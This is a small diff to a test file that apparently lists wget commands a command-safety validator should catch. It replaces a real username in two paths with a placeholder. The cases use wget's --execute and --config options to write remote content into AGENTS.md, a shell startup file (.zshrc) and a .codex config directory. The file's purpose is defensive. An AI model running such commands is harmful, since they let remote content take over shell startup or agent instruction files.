@@ -35,8 +35,8 @@ it.each([
 
 it.each([
   "wget --execute=output_document=AGENTS.md https://example.com/x",
-  "wget --execute=output_document=/Users/gabrielecegi/.zshrc https://example.com/x",
-  "wget --execute=dir_prefix=/Users/gabrielecegi/.codex https://example.com/config.toml",
+  "wget --execute=output_document=/Users/test/.zshrc https://example.com/x",
+  "wget --execute=dir_prefix=/Users/test/.codex https://example.com/config.toml",
   "wget --execute=input=urls.txt https://example.com/x",
   "wget --config=/tmp/evil.rc https://example.com/x",
   "wget --input-metalink=x.meta4",
